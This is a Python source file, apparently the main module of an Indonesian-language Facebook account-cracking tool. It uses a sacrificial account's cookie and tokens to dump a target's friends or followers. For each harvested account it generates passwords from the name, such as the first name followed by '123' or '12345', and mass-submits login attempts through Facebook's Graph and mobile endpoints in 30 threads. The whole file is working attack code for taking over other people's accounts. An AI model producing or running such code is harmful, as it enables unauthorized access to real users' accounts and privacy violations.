from src.module import *
from src.dump import Dump
from src.crack import Login
from concurrent.futures import ThreadPoolExecutor


class Main(Dump):
    def __init__(
        self,
        url: str = "m.facebook.com",
        cookie: str = None,
        tokenEG: str = None,
        tokenEJ: str = None,
    ):
        self._url = url
        self._cookie = {"cookie": cookie}
        self.__tokenEG = tokenEG
        self.__tokenEJ = tokenEJ
        super().__init__(
            cookie=cookie, tokenEG=self._Main__tokenEG, tokenEJ=self._Main__tokenEJ
        )

    def MainMenu(self):
        data_account = self.cekAccount(uid="me")
        if data_account["name"] == None:
            os.remove("data/tokenEG")
            os.remove("data/tokenEJ")
            os.remove("data/cookie.txt")
            exit("Cookies, Token Invalid.")
        print(
            f"""
                Welcome! Silahkan gunakan dengan Bijak.
                
        > Nama: {data_account['name']}
        > Uid: {data_account['uid']}
        > Ttl: {data_account['birthday']}
        
        1) Dump dari Teman
        2) Dump dari Followers
        3) Cek hasil Crack
        0) Logout ACC Tumbal
            """
        )
        choice = input("?> Pilih Menu: ")
        if choice in ["1", "2"]:
            uid = input(">> Masukan UID Target: ")
            cekAccount = self.cekAccount(uid=uid)
            if cekAccount["name"] != None:
                if choice == "1":
                    self._data = self.dumpAccount(uid=uid, choice="friends")
                elif choice == "2":
                    self._data = self.dumpAccount(uid=uid, choice="subscribers")
                print(
                    f"=> Nama: {cekAccount['name']}\n=> Jumlah id: {len(self._data)}\n"
                )

                print(
                    ">= Pilih Metode untuk Crack =<\n1) Metode B-Api\n2) Metode Mobile\n"
                )
                url = (
                    "m.facebook.com"
                    if input("?> Pilih metode: ") == "2"
                    else "graph.facebook.com"
                )
                self.validate(url=url, data=self._data)
            else:
                exit(" Target Tidak Ditemukan ")
        else:
            if choice == "3":
                exit()
            elif choice == "0":
                exit()
            else:
                exit(" Pilihan Tidak Ada ")

    def validate(self, url: str = None, data: list = None):
        Crack = Login(url=url)
        with ThreadPoolExecutor(max_workers=30) as login:
            for x in data:
                uid, name = x.split("|")
                first = name.split(" ")[0]
                password_list = []
                if len(name) >= 6:
                    password_list.append(name)
                if len(first) >= 6:
                    password_list.append(first)
                    password_list.append(first + "12")
                    password_list.append(first + "123")
                    password_list.append(first + "1234")
                    password_list.append(first + "12345")
                elif len(first) >= 4 & len(first) <= 5:
                    password_list.append(first + "12")
                    password_list.append(first + "123")
                    password_list.append(first + "1234")
                    password_list.append(first + "12345")
                elif len(first) <= 3:
                    password_list.append(first + "123")
                    password_list.append(first + "1234")
                    password_list.append(first + "12345")

                login.submit(Crack.login, uid, password_list, data)
